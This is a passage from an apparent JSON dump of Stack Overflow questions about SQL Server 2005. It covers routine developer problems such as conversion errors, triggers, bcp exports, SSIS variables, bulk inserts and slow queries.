[Database].[dbo].[EmpDefaultSchedules] (StaffCode, EmpID, LastName, FirstName, Dept, MgrStaffCode, IsMgr, PayrollStatus, PayFrequency, StdHrsWk, EmailAddress )\nVALUES (@StaffCode, (select EmpID from [Database].[dbo].[Employees] WHERE StaffCode = @StaffCode), @LastName, @FirstName, @Dept, @MgrStaffCode, @IsMgr, @PayrollStatus, @PayrollFrequency, @StdHrsWk, @EmailAddress)\n</code></pre>\n\n<p>When I do this I get this error:</p>\n\n<blockquote>\n  <p>Subqueries are not allowed in this context. Only scalar expressions\n  are allowed.</p>\n</blockquote>\n\n<p>I have seen/read this:\n<a href=\"http://stackoverflow.com/questions/3641068/subqueries-are-not-allowed-in-this-context-only-scalar-expressions-are-allowed\">Subqueries are not allowed in this context. Only scalar expressions are allowed</a></p>\n\n<p>And this:\n<a href=\"http://stackoverflow.com/questions/10269054/mysql-inserting-into-multiple-tables\">MYSQL inserting into multiple tables</a></p>\n\n<p>And this:\n<a href=\"http://stackoverflow.com/questions/861712/how-do-i-store-a-value-from-a-sql-query-into-a-variable\">How do I store a value from a sql query into a variable?</a></p>\n\n<p>And this:\n<a href=\"http://stackoverflow.com/questions/10736506/how-do-i-combine-a-select-where-query-with-an-insert-query\">How do I combine a SELECT + WHERE query with an INSERT query?</a></p>\n\n<p>But still cannot get this to work.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":11789598,"title":"Conversion Failed error in sql","body":"<p>I have a problem in my code and I figure it out:</p>\n\n<pre><code>SELECT\n   pono,\n   convert(varchar,podate,103) as podate,\n   Convert(varchar,validity,103) as validity,\n   OriginalPOno, Sitename, Vendorname \nFROM  dbo.tbl_POR_PO_MAIN \nWHERE originalpono not in (select originalpono from tbl_Despatch_POR_PO_Main)\n  AND pono not in (select pono from tbl_Despatch_POR_PO_Main)\n  AND status=15\n  AND (DATEDIFF(day,getdate(),validity)&lt;=1)\nORDER BY sitename, validity, originalpono \n</code></pre>\n\n<p>This gives me a following error:</p>\n\n<blockquote>\n  <p>Conversion failed when converting datetime from character string.</p>\n</blockquote>\n\n<p>How do I solve this problem?</p>\n"},{"tags":["database","performance","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":11791342,"title":"slow queries on mssql server","body":"<p>We have MS Sql Server 2005. Our main table is the archive table which has nearly 200 million records on it. There are 2000 client that connect a service so the service writes the information to the archive. We have also another service which gets the clients informations from archive as batches  and calculate some another information for each record and rewrite them as batches again.\nOn the webhand-side we have 100-200 users online at a time and most of the queries depends on archive table. I built all possible indexes on archive and i'm using .net framework 3.5. I am connecting the database with standart connection string.</p>\n\n<p>The problem is when a user request for one day long report it returns in 10-15 seconds for 50 records. The one month long reports take more time like 2-3 min for 5k-6k records. \nI am not a DBA but we don't have one so i am expected to tackle this problem. \nCan you make any suggestions for my problem?</p>\n\n<p>Thanks.</p>\n"},{"tags":["sql-server-2008","sql-server-2005","backup","restore"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":181,"score":0,"question_id":11787438,"title":"Backup database in SQL Server 2008 (Compatibility Level 90) restore to 2005","body":"<p>I have a database I was given by a client from a SQL Server 2005. When I restored it on my SQL Server 2008 R2 I made sure the compatibility level was set to 90. </p>\n\n<p>Now I need to back it up and give it back to them and they get the dreaded malformed headers error. </p>\n\n<p>I know I've done this before but cannot remember what needs to be done to allow it to work. </p>\n\n<p>Any ideas?</p>\n\n<p>Thanks</p>\n"},{"tags":["sql","sql-server","sql-server-2005","triggers"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":11787742,"title":"SQL Server trigger on a field that's updated","body":"<p>I have the following trigger:</p>\n\n<pre><code>BEGIN\nDECLARE @email varchar(200)\nDECLARE @jobcode int\nDECLARE @status char(1)\n\nDECLARE @emaild varchar(200)\nDECLARE @jobcoded int\nDECLARE @statusd char(1)\n\nSET @statusd = NULL\n\nSELECT @status = z.status, @email = p.EMail, @jobcode = z.jobID\n    FROM zipoutfiles z\n    INNER JOIN inserted AS i ON z.jobID = i.jobID\n    INNER JOIN PS_LoginUser AS p ON z.UserID = p.UserID\n\nSELECT @statusd = z.status, @emaild = p.EMail, @jobcoded = z.jobID\n    FROM zipoutfiles z\n    INNER JOIN deleted AS d ON z.jobID = d.jobID\n    INNER JOIN PS_LoginUser AS p ON z.UserID = p.UserID\n    WHERE d.jobID = @jobcode\n\n\nIF ((@status = 'D' AND @statusd = 'R') OR (@status = 'D' AND @statusd = 'E'))\nBEGIN\n    EXEC SendMail @email, @jobcode\nEND\nEND\n</code></pre>\n\n<p>I want to be able to run SendMail when status goes from E to D or R to D, but not D to D (if it gets updated again) and also when it gets inserted as D.  What am I doing wrong here:</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":265,"score":0,"question_id":4488694,"title":"Not able to connect to the SQLCMD Utility","body":"<p>When I try to connect to the sql server using the sqlcmd  utility, I use the following syntax:</p>\n\n<pre><code> sqlcmd -q \"SELECT * FROM AdventureWorks2008R2.Person.Person\"\n</code></pre>\n\n<p>I get this following error, can anyone pleae help on this.</p>\n\n<pre><code>HResult 0x2, Level 16, State 1\nNamed Pipes Provider: Could not open a connection to SQL Server [2].\nSqlcmd: Error: Microsoft SQL Native Client : An error has occurred while establi\nshing a connection to the server. When connecting to SQL Server 2005, this failu\nre may be caused by the fact that under the default settings SQL Server does not\n allow remote connections..\nSqlcmd: Error: Microsoft SQL Native Client : Login timeout expired.\n</code></pre>\n"},{"tags":["sql-server-2005","reportingservices-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":11784453,"title":"how to add a total column in matrix on SSRS2005","body":"<p>Hi I create a monthly sale report. there is a week-to-date column at the end of each week, then the end of report, I need to a month-to-date column. The the column will display date and the row will display items. I use SSRS2005 Matrix to do it. I create 8 columns (monday to Sunday, plus WTD) to do it. But I do not have any idea how to solve this MTD column. \nAnyone has idea? Thanks in Advance.</p>\n"},{"tags":["sql-server-2005","function","view","case"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":11783957,"title":"Replacement for a Case statement","body":"<p>I have a function that works off of a view with two case statement.\nThe problem is that because of this case statement, it is taking 25+ seconds to run the function.  Where as it should only be taking ~3 seconds (comparing to an identical function with a view that doesnt call a case statement.)  </p>\n\n<p>The case statement is done within the select.</p>\n\n<p>Interestingly enough(for me),  If I changed one of the case statements to something direct ie D.CARS instead of </p>\n\n<pre><code>CASE WHEN D.CAR IS NOT NULL \nTHEN D.CAR              \nELSE C.CAR\nEND AS CAR,\n</code></pre>\n\n<p>Then it speeds up to ~3 seconds to run the function but shows some off results.  So it only seems to take~25 seconds if there is TWO case statements in the select statement. </p>\n\n<p>The views regardless of number of case statements or not take less than 1 second to populate.</p>\n\n<p>Is there a way to speed it up while still getting the correct results?</p>\n"},{"tags":["sql-server-2005","join","views"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":11769755,"title":"Comparing two views","body":"<p>I current have two views that are pulling in different results. \nOne is in the old database and the other is in the new.<br>\nthe ond view pulls in ~50000 records whereas the new view is pulling in ~40000<br>\nBoth have almost all the same data except for one or two columns.</p>\n\n<p>Is there a way where I can combine the two and see what is different?</p>\n\n<p>I have limit knowledge when it comes to queries and joins.  </p>\n\n<p>I tried left joining and right joining but it is giving me 100000+ results.  I dont want that.  I want ~50000 results and have the columns null where there is no info.</p>\n\n<p>Is this possible? thanks</p>\n"},{"tags":["sql-server-2008","sql-server-2005","hbm2ddl","hibernate3-maven-plugin"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":218,"score":0,"question_id":10900897,"title":"Incompatible API error when using org.hibernate.dialect.SQLServer2008Dialect with hibernate3-maven-plugin","body":"<p>I had previously set my project up to use hibernate3-maven-plugin with org.hibernate.dialect.SQLServerDialect as the hibernate.dialect and everything was working fine.</p>\n\n<p>But when I changed the dialect to org.hibernate.dialect.SQLServer2005Dialect, hibernate3-maven-plugin encounters the following error:</p>\n\n<blockquote>\n  <p>An API incompatibility was encountered while executing org.codehaus.mojo:hibernate3-maven-plugin:2.2:hbm2ddl: java.land.NoSuchMethodError: org.hibernate.dialect.SQLServer2005Dialect.registerColumnType(IJLjava/lang/String;)V</p>\n</blockquote>\n\n<p>Does hbm2ddl support SQLServer2005Dialect or SQLServer2008Dialect (I also get the same error with 2008)? </p>\n\n<p>I am using version 2.2 of the plugin and hibernate.4.1.0.Final and JPA 2.0.</p>\n"},{"tags":["sql-server-2005","dateformat","crystal-reports-2008"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":88,"score":0,"question_id":11052723,"title":"Crystal reports returns zeros when using a date range","body":"<p>I am creating a crystal report that will display a number of counts. This works fine so long as I'm not using date parameters to narrow the results. The moment I try to use dates, my report returns 0 for all counts.</p>\n\n<p>The report uses a command object with the following SQL (obfuscated, but syntactically the same).</p>\n\n<pre><code>SELECT \n(SELECT COUNT(*) FROM REPORT_ WHERE DATE_SUBMITTED IS NOT NULL) AS SUBMITTED,\n(SELECT COUNT(*) FROM REPORT_ WHERE DATE_RECEIVED BETWEEN {?StartDate} AND {?EndDate}) AS TOTALRECEIVED,\n(SELECT COUNT(*) FROM REPORT_ WHERE DATE_RECEIVED BETWEEN {?StartDate} AND {?EndDate} AND STATUS_ LIKE 'A1') AS A1,\n(SELECT COUNT(*) FROM REPORT_ WHERE DATE_RECEIVED BETWEEN {?StartDate} AND {?EndDate} AND STATUS_ LIKE 'A2') AS A2,\n(SELECT COUNT(*) FROM REPORT_ WHERE DATE_RECEIVED BETWEEN {?StartDate} AND {?EndDate} AND STATUS_ LIKE 'A3') AS A3,\n(SELECT COUNT(*) FROM REPORT_ WHERE DATE_RECEIVED BETWEEN {?StartDate} AND {?EndDate} AND STATUS_ LIKE 'A4') AS A4,\n(SELECT COUNT(*) FROM REPORT_ WHERE DATE_RECEIVED BETWEEN {?StartDate} AND {?EndDate} AND STATUS_ LIKE 'A5') AS A5,\n(SELECT COUNT(*) FROM REPORT_ WHERE DATE_RECEIVED BETWEEN {?StartDate} AND {?EndDate} AND STATUS_ LIKE 'OTHER') AS OTHER\n</code></pre>\n\n<p>If I replace the parameters with static values in the command itself, it runs perfectly... But any attemps I've made to use date parameters causes it to fail. I think that it might be that the crystal report is providing a date in a format is intelligable to the ms sql server. I've tried casting, but nothing seems to work. How can I get my date parameters to work?</p>\n"},{"tags":["sql-server-2005","oracle","ssis"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1849,"score":1,"question_id":1395500,"title":"Get a table count in SSIS from an Oracle view","body":"<p>In my SSIS package, I want to see if a particular Oracle view has data in it.\nI have a Execute SQL Task with a select count statement:</p>\n\n<pre><code>Select CAST( count(*) as Integer) As Row_Count from OWNER.VIEW_MV\n</code></pre>\n\n<p>My RowCount is in the Result Set, pointing to my Variable User:TableCount.  If I set TableCount to anything except Object, I get an error such as: </p>\n\n<blockquote>\n  <p>Error: 0xC002F309 at Check for data in\n  view, Execute SQL Task: An error\n  occurred while assigning a value to\n  variable \"TableCount\": \"The type of\n  the value being assigned to variable\n  \"User::TableCount\" differs from the\n  current variable type. Variables may\n  not change type during execution.\n  Variable types are strict, except for\n  variables of type Object.</p>\n</blockquote>\n\n<p>However, if I do make the data type to Object, then in my next step, a Script Task, when I read that object, I don't see how to convert it to an integer so that I can use and view it.  Then I get the error: </p>\n\n<blockquote>\n  <p>Conversion from type 'Object' to type 'Integer' is not valid.</p>\n</blockquote>\n\n<p>with the code</p>\n\n<pre><code>Dim nTableCount As Int32\nnTableCount = CInt(Dts.Variables(\"TableCount\").Value)\n</code></pre>\n\n<p>Perhaps I am going about this wrong.  What is the best way to determine if an Oracle table is empty, and then act on that knowledge?  Essentially, we want an error message about the empty table, rather than continuing on in our process.</p>\n\n<p><strong>Update:</strong>\nI've tried Select CAST( count(*) as char) As Row_Count from OWNER.VIEW_MV where ROWNUM &lt; 2, and sending it to a SSIS variable of type char.  I've cast it to Numeric and Integer, with SSIS variables of Int32, Int64.  I've tried varchar2(20) with SSIS type String.  Everything gives an error except for SSIS datatype Object.  </p>\n\n<p>Right now, I'm saving as datatype Object, but when I try to get the value, setting my nTableCount as String, I can use  nTableCount = Dts.Variables(\"TableCount\").Value().ToString(), but it returns 0.  How do I extract that string out of the Object variable?  (Assuming of course, that it actually put it in there.)</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":11777405,"title":"Remove rows entirely duplicated, leaving only one of them","body":"<p>Please suppose that I have a table with a certain, unspecified number of columns.</p>\n\n<p>I would like to delete the rows entirely duplicated, this means the rows which have all the columns matching in equality, leaving out the duplicated and keeping only 1 row.</p>\n\n<p>How could I achieve this?</p>\n\n<p>Example: SQL Server 2005, table with 5 columns <code>FIELD1, FIELD2, FIELD3, FIELD4, FIELD5</code>:</p>\n\n<pre><code>5   3   2   A   J\n3   5   2   A   J\n5   3   2   A   J\n5   3   2   A   J\n8   B   8   A   K\n</code></pre>\n\n<p>The first row, the third row and the fourth row are duplicates, so you have to leave in the table only one of them.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":5,"favorite_count":2,"up_vote_count":13,"down_vote_count":0,"view_count":12905,"score":13,"question_id":241925,"title":"Is it possible to execute a text file from SQL query?","body":"<p>I have a number of generated .sql files that I want to run in succession.  I'd like to run them from a SQL statement in a query (i.e. Query Analyzer/Server Management Studio).<br />\nIs it possible to do something like this and if so what is the syntax for doing this?</p>\n\n<p>I'm hoping for something like:</p>\n\n<pre><code>exec 'c:\\temp\\file01.sql' \nexec 'c:\\temp\\file02.sql'\n</code></pre>\n\n<p>I am using SQL Server 2005 and running queries in management studio.</p>\n"},{"tags":["sql-server-2008","sql-server-2005","asp.net-mvc-3-areas"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":89,"score":0,"question_id":11775919,"title":"Build Application with asp net mvc3 and sql server enterprise edition server","body":"<p>I need to build an application that is using ASP NET MVC3 and try to connecting to SQL Server Enterprise Server. Could i make it? Because I don't have SQL Server Compact Edition installed and my boss want it to use SQL Server Enterprise Edition. Thx</p>\n"},{"tags":["sql-server-2005"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":101,"score":0,"question_id":5002960,"title":"list of table which has the column in sql server 2005","body":"<p>In my database, I have many tables which has the column StudentId, how can I get the list of the table which has this column in sql server 2005?</p>\n"},{"tags":["php","sql-server-2005","odbc"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":407,"score":0,"question_id":11766036,"title":"SQL error: Data source name not found and no default driver specified","body":"<p>I have installed Xampp with php 5.3.5 on a (64bit) Windows and I want to connect to a Database using a 3rd party ODBC driver in a (32bit) SQL Server 2005 but it always bring the same mistake \"SQL error: Data source name not found and no default driver specified. I have created a System DSN and I try to connect using an odbc_connect. I will truly greatly appreciate any help.</p>\n"},{"tags":["sql-server","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":94,"score":0,"question_id":11760438,"title":"Looping through everysingle text column in a database and doing a replace","body":"<p>I am trying to loop through every single <code>varchar</code>, <code>nvarchar</code> and <code>ntext</code> column in a database and running a <code>replace</code> statement on it using the <code>@string</code>. </p>\n\n<p>However, when the field has only a max length of 50, it should run the replace statement using the <code>@shortstring</code> only.  Like the code below sort of...</p>\n\n<p>What I have so far is something like this:</p>\n\n<pre><code>Declare @string varchar(100), @shortstring varchar(50)\nSet @string = 'fullstring_100_characters'\nSet @shortstring = 'shortstring_50_characters'\n\nUpdate [Table] Set [Column] = Replace([Column],@string,'')\n</code></pre>\n\n<p>But if it's an <code>ntext</code> the statement looks like this, and always uses the <code>@string</code> instead of the <code>@shortstring</code></p>\n\n<pre><code>Update [Table] Set [Column] = CAST(REPLACE(CAST([Column] as NVarchar(MAX)),@string,'') AS NText)\n</code></pre>\n\n<p>Can someone show me how to achieve this?</p>\n"},{"tags":["sql-server-2008","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1135,"score":0,"question_id":9704591,"title":"import xlsx data into sql server 2008","body":"<p>I am able to insert data from xls file in sql server but not able to insert from xlsx file (office 2010) .</p>\n\n<p>the reason behind this for doing this file having more then five lac records and in xls the file limit is 65000 approx records.</p>\n\n<p>Pleas suggest how can i insert data from xlsx in sql server 2008.</p>\n\n<p>Regards,\nManoj </p>\n"},{"tags":["sql","sql-server-2005","join"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":43,"score":0,"question_id":11769821,"title":"Why is my join giving me way too many results?","body":"<p>I have:  </p>\n\n<pre><code>  SELECT  dv.VariableID ,\n            ds.DataSourceID ,\n            p.DataVariableDataSourceParamId ,\n            p.ParamCode ,\n            p.ParamDisplayName ,\n            p.DVDSParamControlType ,\n            p.DependentOnDVDSParamId ,\n            pv.ParamValue\n    FROM    dbo.DataVariable dv\n            INNER JOIN dbo.DataVariableDataSource ds ON dv.DataSourceId = ds.DataSourceID\n            INNER JOIN dbo.DataVariableDataSourceParam p ON ds.DataSourceID = p.DataSourceId\n            INNER JOIN dbo.DataVariableDataSourceParamValue pv ON p.DataVariableDataSourceParamId = pv.DataVariableDataSourceParamId\n    WHERE   dv.VariableID = @vid\n    ORDER BY dv.VariableID\n</code></pre>\n\n<p>When I just have the first two joins, I get what I want: 6 results. When I add the third, I get 660. I just want the ParamValue for the 6 records from the first 2 joins and I can't seem to figure out why this is breaking. I'm on my 12th hour of coding and I'm sure this is insanely obvious, but I could use a hand. Thanks in advance.</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":5,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":335,"score":3,"question_id":2495672,"title":"How can I turn a column name into a result value in SQL Server?","body":"<p>I have a table which has essentially boolean values in a legacy database. The column names are stored as string values in another table so I need to match the column names of one table to a string value in another table. I know there has to be a way to do this directly with SQL in SQL Server but it is beyond me.</p>\n\n<p>My initial thought was to use PIVOT but it is not enabled by default and enabling it would likely be a difficult process with pushing that change to the Production database. I would prefer to use what is enabled by default.</p>\n\n<p>I am considering using COALESCE to translate the boolean value to the string that value that I need. This will be a manual process.</p>\n\n<p>I think I will also use a table variable to insert the results of the first query into that variable and use those results to do the second query. I still have the problem that the columns are on a single row so I wish I could easily pivot the values to put the column names in the result set as strings. But if I could easily do that I could easily write the query with a sub-select.</p>\n\n<p>Any tips are welcome.</p>\n"},{"tags":["performance","sql-server-2005","function"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":23,"score":0,"question_id":11767100,"title":"Disecting a Function for speed","body":"<p>I wanted to know if there was a way to measure the performance of a function.  In parts.</p>\n\n<p>I know that you are able to measure the total time it takes to complete the function but is there a way to measure the individual queires within a function?</p>\n\n<p>Just wanted to know because I can not find the bottleneck for my function's performance.</p>\n"},{"tags":["sql","database","sql-server-2005","tsql","bcp"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":577,"score":1,"question_id":3781227,"title":"Whats wrong with this bcp utility?","body":"<p>I am trying to export data into into a text file using bcp utility? I could n't figure out what i am doing wrong here:-</p>\n\n<pre><code>Declare @Cmd nvarchar(1000)\nDeclare @Query nvarchar(1000)\nDeclare @Path nvarchar(500)\nDeclare @ServerName nvarchar(500)\nDeclare @UserName nvarchar(50)\nDeclare @Password nvarchar(50)\nDeclare @Delimiter char(1)\n\nSET @Path = 'c:\\abc.txt'\nSET @ServerName = '10.10.10.10\\instance1'\nSet @UserName = 'sa'\nSet @Password = '123456'\nSet @Delimiter = '!'\n\nSET @Query = 'SELECT [ID]\n          , NULL\n          ,[NAME]\n          ,[STREET1] + '' '' + [STREET2] as [Address]\n          ,[CITY] + '' '' + [PROVINCE] + '' '' + [POSTAL] as City\n          ,[PHONE] \n          ,[FAX]\n          ,''Title'' as [Title]\n          ,[Country]\nFROM [temp01]'\nSET @Cmd = 'bcp \"' + @Query + '\" queryout \"' +  @Path +\n         '\" -c -S' + @ServerName + ' -U' + @UserName + ' -P' + \n        @Password + ' -t' + @Delimiter + ''\nEXEC master..xp_cmdshell @Cmd\n</code></pre>\n\n<p>It is not writing any data into the file. In result box i am getting this output:-</p>\n\n<p>usage: bcp {dbtable | query} {in | out | queryout | format} datafile\n  [-m maxerrors]            [-f formatfile]          [-e errfile]\n  [-F firstrow]             [-L lastrow]             [-b batchsize]\n  [-n native type]          [-c character type]      [-w wide character type]\n  [-N keep non-text native] [-V file format version] [-q quoted identifier]\n  [-C code page specifier]  [-t field terminator]    [-r row terminator]\n  [-i inputfile]            [-o outfile]             [-a packetsize]\n  [-S server name]          [-U username]            [-P password]\n  [-T trusted connection]   [-v version]             [-R regional enable]\n  [-k keep null values]     [-E keep identity values]\n  [-h \"load hints\"]\nNULL\n[-h \"load hints\"] NULL</p>\n\n<p>Please help.</p>\n"},{"tags":["sql-server","sql-server-2005","sql-agent-job","sql-agent"],"answer_count":2,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":600,"score":2,"question_id":7084333,"title":"SQL Server Agent Job Running Slow","body":"<p>I am executing a stored procedure using SQL Server Agent Job in SQL Server 2005. </p>\n\n<p>This job was running fast until yesterday.  Since yesterday this job is taking more than 1 hour instead of 2 mins. </p>\n\n<p>I executed the stored procedure in SSMS, it just took less than 1 minute to execute. </p>\n\n<p>I could not figure out why it is taking more than 1 hour when executed as a SQL Server Agent job? </p>\n"},{"tags":["sql","tsql","sql-server-2005","while-loop"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":75,"score":1,"question_id":11764972,"title":"While loop issues","body":"<p>This query is supposed to be dropping temp tables/views from a sql DB however when dropping the last table/view it keeps looping. Anyone have an answer as why this would be going into an infinite loop when dropping the last table?</p>\n\n<pre><code>DECLARE @name VARCHAR(128)\n\nDECLARE @SQL VARCHAR(254)\n\nDECLARE @type VARCHAR(50)\n\nDECLARE @tmp_table TABLE\n    (\n      table_name VARCHAR(50)\n    , table_type VARCHAR(50)\n    )\n\n;WITH    cte_tempTables\n\n          AS (\n               SELECT\n                table_name\n              , crdate\n              , crdate + 90 [ExperiationDate]\n              , TABLE_TYPE\n               FROM\n                INFORMATION_SCHEMA.TABLES t\n               inner join sysobjects s\n                on s.name = t.table_name\n               WHERE\n                TABLE_CATALOG = 'SBR_Temp'\n                AND t.table_name NOT IN ( 'DaleDelq' ,'tblCancelContract' ,\n                                          'tblCreateContracts' ,'MWFRTPay' )\n\n             )\n\n    INSERT INTO\n        @tmp_table\n        (\n          table_name\n        , table_type \n        )\n        select\n            table_name\n          , table_type\n\n        FROM\n            [cte_tempTables]\n        WHERE\n            ExperiationDate &lt; GETDATE()\n\nSELECT TOP 1\n    @name = [table_name]\n  , @type = CASE WHEN [table_type] = 'BASE TABLE' THEN 'TABLE'\n                 ELSE 'VIEW'\n            END\n\nFROM\n    @tmp_table\n\nWHILE @name IS NOT NULL\n\n    OR @name &lt;&gt; ''\n\n    BEGIN\n        SELECT\n            @SQL = 'DROP ' + @type + ' SBR_Temp.[dbo].[' + RTRIM(@name) + ']'\n            --EXEC (@SQL)\n        PRINT 'Dropped ' + @type + ':' + @name\n\n        DELETE\n            @tmp_table\n        WHERE\n            [table_name] = @name\n\n        SELECT TOP 1\n            @name = [table_name]\n          , @type = CASE WHEN [table_type] = 'BASE TABLE' THEN 'TABLE'\n                         ELSE 'VIEW'\n                    END\n        FROM\n            @tmp_table\n            SELECT @name\n    END\nGO\n</code></pre>\n\n<p>here is an example of the results</p>\n\n<p>(4 row(s) affected)\nDropped VIEW:vue_SunsetCoveClientInventory</p>\n\n<p>(1 row(s) affected)</p>\n\n<p>(1 row(s) affected)\nDropped VIEW:vue_SunsetCoveClientCoOwners</p>\n\n<p>(1 row(s) affected)</p>\n\n<p>(1 row(s) affected)\nDropped TABLE:BKDischarge</p>\n\n<p>(1 row(s) affected)</p>\n\n<p>(1 row(s) affected)\nDropped VIEW:vue_nocoop</p>\n\n<p>(1 row(s) affected)</p>\n\n<p>(1 row(s) affected)\nDropped VIEW:vue_nocoop</p>\n\n<p>(0 row(s) affected)</p>\n\n<p>(1 row(s) affected)\nDropped VIEW:vue_nocoop</p>\n\n<p>(0 row(s) affected)</p>\n\n<p>(1 row(s) affected)\nDropped VIEW:vue_nocoop</p>\n\n<p>(0 row(s) affected)</p>\n\n<p>(1 row(s) affected)\nDropped VIEW:vue_nocoop</p>\n\n<p>(0 row(s) affected)</p>\n\n<p>(1 row(s) affected)\nDropped VIEW:vue_nocoop</p>\n\n<p>(0 row(s) affected)</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":147,"score":1,"question_id":11335436,"title":"Bulk insert into SQL Server 2005 issue","body":"<p>I've tried bulk insert but I can't get it right. I have a table schema that starts with an id and a few more columns then I need to skip a column. Whats the proper way to assign the columns to each one from a csv?</p>\n\n<p>Thanks</p>\n\n<p>EDIT:</p>\n\n<p>MY Code:</p>\n\n<pre><code>BULK INSERT datadb\nfrom 'C:\\datainsert.csv'\nWITH\n(\nFIRSTROW=2,\nFIELDTERMINATOR = ',',\nROWTERMINATOR = '\\n'\n)\nGO\n</code></pre>\n\n<p>The errors is talking about my first column being a different datatype since I have an ID column </p>\n"},{"tags":["sql","sql-server-2005","rownumber"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":11762700,"title":"how do i get the row id of the table in sql server","body":"<p>i have one table <code>CSBCA1_5_FPCIC_2012_EES207201222743</code>, having two columns <code>employee_id</code> and <code>employee_name</code></p>\n\n<p>i have used </p>\n\n<p><code>SELECT ROW_NUMBER() OVER (ORDER BY EMPLOYEE_ID) AS ID, EMPLOYEE_ID,EMPLOYEE_NAME FROM CSBCA1_5_FPCIC_2012_EES207201222743</code> </p>\n\n<p>But, it is return in the ascending order of <code>employee_id</code> but i need the information, in which they have been inserted into the table.</p>\n\n<p>Thanks in advance !!</p>\n"},{"tags":["sql-server-2005","ssis","data-migration","advantage-database-server"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":995,"score":1,"question_id":4683985,"title":"SSIS Advantage timestamp to SQL Datetime","body":"<p>I am new to using SSIS 2008 and am currently working on migrating data from an old Advantage database over to SQL Server 2005. I set up the SSIS package with a dataflow object with a source and a destination. Copying most of the columns works great, but when I try to copy the Advantage Timestamp columns over to a DateTime field, I get many errors. I believe they are all overflow errors, which is understandable in how Advantage stores the timestamp information. My question is what is the best way to convert this column into the the correct DATETIME field in SQL Server 2005?</p>\n\n<p>Doing a little thinking I felt I could copy the Advantage TimeStamp column into a varchar column and then run a sql script that would do the conversion for me. I was wondering if there is a more elegant way, or what a normal solution to this type of problem is.</p>\n\n<p>Thank you for all of your help and suggestions!</p>\n"},{"tags":["sql-server","sql-server-2005","jdbc"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":713,"score":1,"question_id":3650056,"title":"JTDS Connection problems to SQL Server - Works on 2000 but not 2005","body":"<p>I've been trying to get a java application connecting via the jtds jdbc to a couple of SQL servers.  I have to connect via windows authentication.  </p>\n\n<p>The connection string specified is:  </p>\n\n<pre><code>String connectionString = _\"jdbc:jtds:sqlserver://\"+server+\":\"+port+\"/\"+database+\";domain=\"+domain;_\n</code></pre>\n\n<p>and I am getting the connection via:  </p>\n\n<pre><code>con = java.sql.DriverManager.getConnection(url, _username, _password);\n</code></pre>\n\n<p>This works fine on my SQL Server 2000 but not on the SQL Server 2005.  On my SQL Server 2005, I get the following error message:</p>\n\n<p><strong>java.sql.SQLException: Login failed for user ''. The user is not associated with a trusted SQL Server connection.</strong></p>\n\n<p>Looks a bit funny to be because the user in the exception is blank, but the username specified in the parameter was not blank.</p>\n\n<p>I have a feeling it might be something to do with NTLM and Windows authentication because it works when I try to log using SQL authentication (ie.without the domain property)</p>\n"},{"tags":["sql","sql-server-2008","tsql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":11762904,"title":"Does ms sql server not take ReadPast Hint in Functions?","body":"<p>I have a pending order table with a check constraint to prevent people from ordering an item we don't have in stock.  This required me to create a counter function to decide if an insert can happen or not.  It works until there is 1 item left in inventory then I get a message that we are out of stock of the item.  I thought it was a dirty read issue but even after interducing a ReadPast hint I still see this behavior.  Is there some other factor causing this problem? Or do I need to setup the isolation level differently?</p>\n\n<p>I have tried calling this function with the sprokID and it returns true which is why I am thinking during insert there is a dirty read taking place.</p>\n\n<pre><code>ALTER TABLE [dbo].[PendingSprokOrders]  WITH CHECK ADD  CONSTRAINT [CK_SprokInStock] CHECK  (([dbo].[SprokInStockCount]([SprokID])=(1)))\n\nFUNCTION [dbo].[SprokInStockCount] ( @SprokId INT )\nRETURNS INT\nAS \n    BEGIN \n\n        DECLARE @Active INT\n        SET @Active = ( SELECT  COUNT(*)\n                        FROM    [PendingSprokOrders] AS uac   WITH(READPAST)\n                        WHERE   uac.SprokID = @SprokId\n                      ) \n        DECLARE @Total INT\n        SET @Total = ( SELECT\n                                